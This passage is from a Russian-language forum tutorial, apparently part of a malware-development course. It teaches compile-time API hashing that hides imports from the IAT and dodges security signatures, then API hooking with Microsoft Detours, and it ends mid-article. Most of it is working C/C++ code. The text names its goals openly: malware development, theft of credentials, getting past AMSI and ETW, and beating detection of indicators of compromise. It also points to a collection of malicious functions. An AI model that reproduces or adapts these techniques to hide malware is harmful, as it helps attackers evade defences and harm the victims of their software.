Это демо использует GetModuleHandleH и GetProcAddressH для вызова MessageBoxA.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define USER32DLL_HASH 0x81E3778E
               #define MessageBoxA_HASH 0xF10E27CAint

main() {

// Загрузите User32.dll в текущий процесс, чтобы GetModuleHandleH работал
if (LoadLibraryA(&quot;USER32.DLL&quot;) == NULL) {
    printf(&quot;[!] LoadLibraryA не удалось с ошибкой : %d \n&quot;, GetLastError());
    return 0;
}

// Получение дескриптора user32.dll с помощью GetModuleHandleH
HMODULE hUser32Module = GetModuleHandleH(USER32DLL_HASH);
if (hUser32Module == NULL){
    printf(&quot;[!] Не удалось получить дескриптор User32.dll \n&quot;);
    return -1;
}

// Получение адреса функции MessageBoxA с помощью GetProcAddressH
fnMessageBoxA pMessageBoxA = (fnMessageBoxA)GetProcAddressH(hUser32Module, MessageBoxA_HASH);
if (pMessageBoxA == NULL) {
    printf(&quot;[!] Не удалось найти адрес указанной функции \n&quot;);
    return -1;
}

// Вызов MessageBoxA
pMessageBoxA(NULL, &quot;Создание вредоносных программ с RuSfera&quot;, &quot;Вау&quot;, MB_OK | MB_ICONEXCLAMATION);

printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы выйти ... &quot;);
getchar();

return 0;
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746784951280.png"
		data-src="https://osint42.org/attachments/1746784951280-png.188/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784951280-png.188/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784951280.png"
			title="1746784951280.png"
			width="1306" height="527" loading="lazy" />
	</div><br />
<br />
Использование хэширования API для маскировки IAT реализации является эффективным методом. Однако иногда замена самого WinAPI, если это возможно, может улучшить скрытность IAT, уменьшая количество хэш-значений, а также уменьшая потенциальные эвристические сигнатуры, связанные с алгоритмом хэширования API. Кроме того, реализация пользовательского кода для функции WinAPI может использоваться в различных реализациях, что упрощает автоматизацию общего процесса скрытия IAT.<br />
<br />
Можно посмотреть реализацию некоторых API здесь:<a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">GitHub - vxunderground/VX-API: Collection of various malicious functionality to aid in malware development</a><br />
<br />
<b>Генерация хешей во время компиляции программы</b><br />
В этой статье хеширования API хеши функций и модулей генерировались перед их добавлением в код. К сожалению, это может занять много времени, и этого можно избежать, используя хеширование API во время компиляции.<br />
<br />
Кроме того, в статье выше хеши были жестко закодированы, что позволяет системам безопасности использовать их в качестве индикаторов заражения, если они не обновляются в каждой реализации. Однако при хешировании API во время компиляции динамические хеши генерируются каждый раз при компиляции двоичного файла.<br />
<br />
<b>Оговорка</b><br />
<br />
Этот метод работает только с проектами на C++ из-за использования ключевого слова constexpr. Оператор constexpr в C++ используется для указания на то, что функция или переменная может быть вычислена на этапе компиляции. Кроме того, оператор constexpr на функциях и переменных улучшает производительность приложения, позволяя компилятору выполнять определенные вычисления на этапе компиляции, а не во время выполнения.<br />
<br />
<b>Пошаговое руководство по хешированию во время компиляции</b><br />
<br />
Ниже приведены шаги, необходимые для реализации хеширования во время компиляции.<br />
<br />
<b>Создание функций во время компиляции </b><br />
<br />
Первым шагом является преобразование используемых хеш-функций в функции, выполняемые во время компиляции, с использованием оператора constexpr. В данном случае алгоритм хеширования Dbj2 будет изменен для использования оператора constexpr.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define SEED 5 // Функция хеширования Djb2 во время компиляции (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// Функция хеширования Djb2 во время компиляции (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}</code></pre>
	</div>
</div><br />
Неопределенная переменная, g_KEY, используется в качестве начального хеша в обеих функциях.<br />
<br />
g_KEY - это глобальная переменная constexpr и она случайным образом генерируется функцией RandomCompileTimeSeed (объясняется ниже) при каждой компиляции двоичного файла.<br />
<br />
Генерация случайного значения начального числа RandomCompileTimeSeed используется для генерации случайного значения начального числа на основе текущего времени. Он делает это, извлекая цифры из макроса TIME, который является предопределенным макросом в C++, который расширяется до текущего времени в формате ЧЧ:ММ:СС. Затем функция RandomCompileTimeSeed умножает каждую цифру на разную случайную константу и складывает их все вместе, чтобы получить окончательное значение начального числа.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Генерировать случайный ключ на этапе компиляции, который используется как начальный хеш
constexpr int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// Компилируемое время случайного начального числа
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;</code></pre>
	</div>
</div><br />
<b>Создание макросов</b><br />
<br />
Затем определите два макроса, RTIME_HASHA и RTIME_HASHW, которые будут использоваться функцией GetProcAddressH во время выполнения для сравнения хешей. Макросы следует определить следующим образом.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)       // Вызов HashStringDjb2A
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)    // Вызов HashStringDjb2W</code></pre>
	</div>
</div><br />
Как только функция хеширования во время компиляции будет установлена, следующим шагом будет объявление значений хеша во время компиляции в переменных. Для автоматизации процесса будут реализованы два макроса.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);</code></pre>
	</div>
</div><br />
<b>Оператор преобразования в строку</b><br />
<br />
Символ # известен как оператор преобразования в строку. Он используется для преобразования параметра макропроцессора в строковый литерал.<br />
<br />
Например, если макрос CTIME_HASHA вызван с аргументом SomeFunction, как HASHA(SomeFunction), выражение #API будет заменено строковым литералом &quot;SomeFunction&quot;.<br />
<br />
<b>Оператор объединения</b><br />
<br />
Оператор ## известен как оператор объединения. Он используется для объединения двух макросов в один макрос.<br />
Оператор ## используется для объединения параметра API со строкой &quot;_Rotr32A&quot; или &quot;_Rotr32W&quot; соответственно, чтобы формировать окончательное имя определяемой переменной.<br />
<br />
Например, если макрос CTIME_HASHA вызван с аргументом SomeFunction, как HASHA(SomeFunction), оператор ## объединит API с &quot;_Rotr32A&quot; для формирования окончательного имени переменной SomeFunction_Rotr32A.<br />
<br />
<b>Демонстрация расширения макроса </b><br />
<br />
Чтобы лучше понять, как работают предыдущие макросы, на изображении ниже показан пример использования макроса CTIME_HASHA для создания хеша для MessageBoxA, создавая переменную под названием MessageBoxA_Rotr32A, которая будет содержать значение хеша во время компиляции.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784966961.png"
		data-src="https://osint42.org/attachments/1746784966961-png.189/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784966961-png.189/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784966961.png"
			title="1746784966961.png"
			width="1205" height="145" loading="lazy" />
	</div><br />
<br />
<b>Хеширование во время компиляции - Код</b><br />
<br />
Собрав все вместе, код будет выглядеть следующим образом.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;winternl.h&gt;
#define SEED 5 // генерировать случайный ключ (используется как начальный хеш)
constexpr int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// Функция хеширования Djb2 во время компиляции (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// Функция хеширования Djb2 во время компиляции (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// макросы хеширования во время выполнения
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)
// макросы хеширования во время компиляции (используются для создания переменных)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) { // проверка значения хеша во время выполнения
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>Демо</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784976541.png"
		data-src="https://osint42.org/attachments/1746784976541-png.190/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784976541-png.190/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784976541.png"
			title="1746784976541.png"
			width="1558" height="312" loading="lazy" />
	</div></div>
						

							<h2>Кунгфу-2.Изучаем API Hooking</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746785165779.png"
		data-src="https://osint42.org/attachments/1746785165779-png.191/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785165779-png.191/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785165779.png"
			title="1746785165779.png"
			width="1000" height="667" loading="lazy" />
	</div><br />
<br />
<b>Введение </b><br />
<br />
API Hooking — это техника, используемая для перехвата и изменения поведения функции API. Она часто используется для отладки, обратного проектирования и взлома игр.<br />
API Hooking позволяет заменять оригинальную реализацию функции API собственной версией, которая выполняет некоторые дополнительные действия до или после вызова оригинальной функции. Это позволяет изменять поведение программы без изменения её исходного кода.<br />
<br />
<b>Трамплины</b><br />
<br />
Классический способ реализации API-хуков осуществляется с помощью трамплинов.<br />
Трамплин — это шеллкод, который используется для изменения пути выполнения кода путем перехода на другой конкретный адрес в адресном пространстве процесса. Шеллкод трамплина вставляется в начало функции, в результате чего функция становится &quot;подцепленной&quot;. Когда вызывается подцепленная функция, вместо нее активируется шеллкод трамплина, и поток выполнения передается и изменяется на другой адрес, что приводит к выполнению другой функции.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785174606.png"
		data-src="https://osint42.org/attachments/1746785174606-png.192/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785174606-png.192/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785174606.png"
			title="1746785174606.png"
			width="1058" height="385" loading="lazy" />
	</div><br />
<br />
<b>Встраиваемый Хук</b><br />
<br />
Встраиваемый хук — это альтернативный метод выполнения API-хуков, который работает аналогично хуку на основе трамплина. Разница заключается в том, что встраиваемые хуки возвращают выполнение законной функции, позволяя нормальному выполнению продолжаться. Несмотря на то что они сложнее в реализации и потенциально труднее в обслуживании, встраиваемые хуки более эффективны.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785181159.png"
		data-src="https://osint42.org/attachments/1746785181159-png.193/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785181159-png.193/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785181159.png"
			title="1746785181159.png"
			width="1020" height="396" loading="lazy" />
	</div><br />
<br />
API-хук выполняется некоторыми средствами безопасности, чтобы позволить им более тщательно изучать часто злоупотребляемые функции. Об этом будет подробнее рассказано далее.<br />
<br />
<b>Зачем API-Хук</b><br />
<br />
Хотя API-хук в основном используется для анализа вредоносного ПО и целей отладки, его можно использовать при разработке вредоносного ПО по следующим причинам:<br />
<br />
Сбор конфиденциальной информации или данных (например, учетные данные).<br />
<br />
Изменение или перехват вызовов функций в злонамеренных целях.<br />
<br />
Обход мер безопасности путем изменения поведения операционной системы или программы (например, AMSI, ETW).<br />
<br />
<b>Реализация Хука</b><br />
<br />
Существует много способов реализации API-хука, один из способов — через открытые библиотеки, такие как библиотека <a href="https://github.com/microsoft/Detours" target="_blank" class="link link--external" rel="noopener">Detours от Microsoft</a> и <a href="https://github.com/TsudaKageyu/minhook" target="_blank" class="link link--external" rel="noopener">Minhook</a>. Еще один, более ограниченный способ, — использование API Windows, предназначенных для выполнения API-хука (хотя с ограниченными возможностями).<br />
<br />
Далее в статье будут продемонстрированы как Detours, так и Minhook.<br />
<br />
Кроме того, будут использованы API Windows, чтобы увидеть, что они могут предложить.<br />
<br />
<b>Наконец, будет создан пользовательский код хука,</b> чтобы уменьшить подписи и индикаторы компрометации, которые обычно используются для обнаружения использования открытых библиотек.<br />
<br />
Итак начнём.)<br />
<br />
API Hooking - <a href="https://github.com/microsoft/Detours" target="_blank" class="link link--external" rel="noopener">Библиотека Detours</a><br />
<br />
Библиотека Detours для хука, разработанная Microsoft Research, позволяет перехватывать и перенаправлять вызовы функций в Windows.<br />
Библиотека перенаправляет вызовы определенных функций к пользовательской заменяющей функции, которая может затем выполнять дополнительные задачи или изменять поведение исходной функции.<br />
Detours обычно используется с программами на C/C++ и может быть использована как с 32-битными, так и с 64-битными приложениями.<br />
<br />
Страница wiki библиотеки доступна <a href="https://github.com/microsoft/Detours/wiki/" target="_blank" class="link link--external" rel="noopener">здесь.</a><br />
<br />
<b>Транзакции</b><br />
<br />
Библиотека Detours заменяет первые несколько инструкций целевой функции, то есть функции, к которой применяется хук, безусловным переходом к пользовательской функции обходного пути, которая будет выполнена вместо неё.<br />
Термин &quot;безусловный переход&quot; также называется &quot;трамплином&quot;.<br />
<br />
Библиотека использует транзакции для установки и удаления хуков из целевой функции. Транзакции позволяют группировать несколько функций хуков вместе и применять их как единую единицу, что может быть полезно при внесении нескольких изменений в поведение программы. Это также предоставляет преимущество в том, что пользователь может легко отменить все изменения при необходимости. При использовании транзакций можно начать новую транзакцию, добавить функции хуков и затем подтвердить её. При подтверждении транзакции все функции хуков, добавленные к транзакции, будут применены к программе, как это было бы в случае с удалением хука.<br />
<br />
<b>Использование библиотеки Detours</b><br />
<br />
Для использования функций библиотеки Detours необходимо загрузить и скомпилировать репозиторий Detours, чтобы получить необходимые статические файлы библиотеки (.lib). Кроме того, следует включить заголовочный файл detours.h, что объясняется в разделе &quot;Использование Detours&quot; на вики Detours.<br />
<br />
Для дополнительной помощи в добавлении .lib файлов в проект ознакомьтесь <a href="https://learn.microsoft.com/en-us/cpp/build/reference/dot-lib-files-as-linker-input?view=msvc-170" target="_blank" class="link link--external" rel="noopener">с документацией Microsoft.</a><br />
<br />
<b>32-битная vs 64-битная библиотека Detours</b><br />
<br />
Предоставленный в этой статье код содержит препроцессорный код, который определяет, какую версию файла .lib Detours следует включить, в зависимости от архитектуры используемой машины. Для этого используются макросы _M_X64 и _M_IX86. Эти макросы определены компилятором для указания, работает ли машина на 64-битной или 32-битной версии Windows. Препроцессорный код выглядит следующим образом:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Если компилируется как 64-бит
#ifdef _M_X64
#pragma comment (lib, &quot;detoursx64.lib&quot;)
#endif // _M_X64
// Если компилируется как 32-бит
#ifdef _M_IX86
#pragma comment (lib, &quot;detoursx86.lib&quot;)
#endif // _M_IX86</code></pre>
	</div>
</div><br />
#ifdef _M_X64 проверяет, определен ли макрос _M_X64, и если он определен, следующий за ним код будет включен в компиляцию. Если он не определен, код будет проигнорирован. Аналогично, #ifdef _M_IX86 проверяет, определен ли макрос _M_IX86, и если он определен, следующий за ним код будет включен в компиляцию. #pragma comment (lib, &quot;detoursx64.lib&quot;) используется для связывания библиотеки detoursx64.lib во время компиляции для 64-битных систем, и #pragma comment (lib, &quot;detoursx86.lib&quot;) используется для связывания библиотеки detoursx86.lib во время компиляции для 32-битных систем.<br />
<br />
Файлы detoursx64.lib и detoursx86.lib создаются при компиляции библиотеки Detours, detoursx64.lib создается при компиляции библиотеки Detours как 64-битный проект, таким же образом файл detoursx86.lib создается при компиляции библиотеки Detours как 32-битный проект.<br />
<br />
<b>Функции API Detours</b><br />
<br />
При использовании любого метода хуков первым шагом всегда является получение адреса функции WinAPI для хука. Адрес функции требуется для определения, где будут размещены инструкции перехода. В этом модуле функция MessageBoxA будет использоваться как функция для хука.<br />
<br />
Ниже перечислены функции API, которые предлагает библиотека Detours:<br />
<ul>
<li data-xf-list-type="ul">DetourTransactionBegin - начать новую транзакцию для установки или удаления обходных путей. Эту функцию следует вызывать первой при установке и удалении хука.</li>
<li data-xf-list-type="ul">DetourUpdateThread - обновить текущую транзакцию. Это используется библиотекой Detours для включения потока в текущую транзакцию.</li>
<li data-xf-list-type="ul">DetourAttach - установить хук на целевую функцию в текущей транзакции. Это не будет зафиксировано, пока не будет вызвана функция DetourTransactionCommit.</li>
<li data-xf-list-type="ul">DetourDetach - удалить хук с целевой функции в текущей транзакции. Это не будет зафиксировано, пока не будет вызвана функция DetourTransactionCommit.</li>
<li data-xf-list-type="ul">DetourTransactionCommit - подтвердить текущую транзакцию для установки или удаления обходных путей. Возвращаемое значение функций выше - это значение LONG, которое используется для понимания результата выполнения функции. API Detours вернет NO_ERROR, которое равно 0, если она завершится успешно, и ненулевое значение в случае ошибки. Ненулевое значение может быть использовано как код ошибки для целей отладки.</li>
</ul><b>Замена подцепленного API </b><br />
<br />
Следующим шагом является создание функции для замены подцепленного API. Функция замены должна иметь тот же тип данных и, по желанию, принимать те же параметры. Это позволяет проверять или изменять значения параметров. Например, следующая функция может быть использована в качестве функции обходного пути для MessageBoxA, что позволяет проверять исходные значения параметров.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // мы можем проверять hWnd - lpText - lpCaption - параметры uType
}</code></pre>
	</div>
</div><br />
Стоит отметить, что функция замены может принимать меньше параметров, но не может принимать больше, чем исходная функция, потому что тогда она будет обращаться к недействительному адресу, что вызовет исключения нарушения доступа.<br />
<br />
<b>Проблема бесконечного цикла</b><br />
<br />
Когда вызывается подцепленная функция и активируется хук, выполняется пользовательская функция, однако для продолжения потока выполнения пользовательская функция должна вернуть действительное значение, которое исходная подцепленная функция должна была вернуть. Наивный подход заключается в том, чтобы вернуть то же значение, вызывая исходную функцию внутри хука. Это может привести к проблемам, так как вместо заменяющей функции будет вызываться исходная функция, <b>что приведет к бесконечному циклу. </b>Это общая проблема хуков и не ошибка в библиотеке Detours.<br />
<br />
Для лучшего понимания рассмотрите приведенный ниже фрагмент кода, показывающий функцию замены MyMessageBoxA, вызывающую MessageBoxA. Это приводит к бесконечному циклу. Программа застрянет на выполнении MyMessageBoxA, потому что MyMessageBoxA вызывает MessageBoxA, и MessageBoxA ведет к функции MyMessageBoxA снова.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Вывод оригинальных значений параметров
  printf(&quot;Оригинальный параметр lpText    : %s\n&quot;, lpText);
  printf(&quot;Оригинальный параметр lpCaption : %s\n&quot;, lpCaption);

  // НЕ ДЕЛАЙТЕ ТАК
  // Изменение значений параметров
  return MessageBoxA(hWnd, &quot;другой lpText&quot;, &quot;другой lpCaption&quot;, uType); // Вызов MessageBoxA (этот хук активен)
}</code></pre>
	</div>
</div><br />
<b>Решение 1 - Глобальный указатель</b> <b>на оригинальную функцию</b><br />
<br />
Библиотека Detours может решить эту проблему, сохранив указатель на исходную функцию перед ее подцеплением. Этот указатель можно сохранить в глобальной переменной и вызвать вместо подцепленной функции в функции обходного пути.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Используется как не подцепленная MessageBoxA в `MyMessageBoxA`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Вывод оригинальных значений параметров
  printf(&quot;Оригинальный параметр lpText    : %s\n&quot;, lpText);
  printf(&quot;Оригинальный параметр lpCaption : %s\n&quot;, lpCaption);

  // Изменение значений параметров
  // Вызов не подцепленной MessageBoxA
  return g_pMessageBoxA(hWnd, &quot;другой lpText&quot;, &quot;другой lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
<b>Решение 2 - Использование другого API </b><br />
<br />
Еще одно более общее решение, которое стоит упомянуть, заключается в вызове другой не подцепленной функции, которая имеет такую же функциональность, как и подцепленная функция. Например, MessageBoxA и MessageBoxW, VirtualAlloc и VirtualAllocEx.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
  // Вывод оригинальных значений параметров
  printf(&quot;Оригинальный параметр lpText    : %s\n&quot;, lpText);
  printf(&quot;Оригинальный параметр lpCaption : %s\n&quot;, lpCaption);

  // Изменение значений параметров
  return MessageBoxW(hWnd, L&quot;другой lpText&quot;, L&quot;другой lpCaption&quot;, uType);
}</code></pre>
	</div>
</div><br />
<b>Процедура хука Detours</b><br />
<br />
Как было объяснено ранее, библиотека Detours работает с использованием транзакций, поэтому для установки хука на функцию API необходимо создать транзакцию, представить действие (установка/удаление хука) для транзакции, а затем подтвердить транзакцию. Приведенный ниже фрагмент кода выполняет эти шаги.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Используется как не подцепленная MessageBoxA в `MyMessageBoxA`
// И используется в `DetourAttach` &amp; `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

// Функция, которая будет запускаться вместо MessageBoxA при активации хука
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

    printf(&quot;[+] Оригинальные параметры : \n&quot;);
    printf(&quot;\t - lpText    : %s\n&quot;, lpText);
    printf(&quot;\t - lpCaption    : %s\n&quot;, lpCaption);

    return g_pMessageBoxA(hWnd, &quot;другой lpText&quot;, &quot;другой lpCaption&quot;, uType);
}

BOOL InstallHook() {

    DWORD    dwDetoursErr = NULL;

      // Создание транзакции и её обновление
    if ((dwDetoursErr = DetourTransactionBegin()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionBegin завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    if ((dwDetoursErr = DetourUpdateThread(GetCurrentThread())) != NO_ERROR) {
        printf(&quot;[!] DetourUpdateThread завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // Запуск MyMessageBoxA вместо g_pMessageBoxA, который является MessageBoxA
    if ((dwDetoursErr = DetourAttach((PVOID)&amp;g_pMessageBoxA, MyMessageBoxA)) != NO_ERROR) {
        printf(&quot;[!] DetourAttach завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

      // Фактическая установка хука происходит после `DetourTransactionCommit` - подтверждение транзакции
    if ((dwDetoursErr = DetourTransactionCommit()) != NO_ERROR) {
        printf(&quot;[!] DetourTransactionCommit завершилась ошибкой с кодом : %d \n&quot;, dwDetoursErr);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Процедура удаления хука Detours</b><br />
<br />
Приведенный ниже фрагмент кода показывает ту же процедуру, что и в предыдущем разделе, но это для удаления хука.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Используется как не подцепленная MessageBoxA в `MyMessageBoxA`
// И используется в `DetourAttach` &amp; `DetourDetach`
fnMessageBoxA g_pMessageBoxA = MessageBoxA;

// Функция, которая будет запускаться вместо MessageBoxA при активации хука
INT WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {

    printf(&quot;[+] Оригинальные параметры : \n&quot;);
    printf(&quot;\t - lpText    : %s\n&quot;, lpText);
